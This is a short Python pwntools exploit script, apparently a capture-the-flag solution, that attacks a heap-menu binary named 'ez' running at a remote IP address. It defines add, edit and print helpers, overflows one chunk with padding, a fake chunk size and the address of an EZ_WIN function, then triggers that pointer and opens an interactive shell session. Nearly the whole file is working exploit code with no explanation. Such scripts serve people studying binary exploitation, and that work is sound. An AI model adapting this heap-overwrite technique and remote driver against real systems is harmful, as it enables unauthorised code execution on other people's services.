from pwn import *

# p = process("./ez")
p = remote("128.199.157.172", 23170)
binary = ELF("./ez")

def add(size, content):
    p.sendline('1')
    p.sendline(str(size))
    p.sendline(content)

def edit(idx, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(content)

def print_meme(idx):
    p.sendline('3')
    p.sendline(str(idx))

def exploit():
    exit_got = binary.got['exit']
    gets_got = binary.got['gets']
    ez_win = binary.symbols['EZ_WIN']
    add(0x8, '')
    add(0x8, '')
    add(0x8, '')
    add(0x8, '')
    edit(0, '\x00' * 0x18 + p64(0x21) + p64(ez_win))
    print_meme(1)

    # gdb.attach(p, 'b *0x00000000004015c7')
    p.interactive()

if __name__ == "__main__":
    exploit()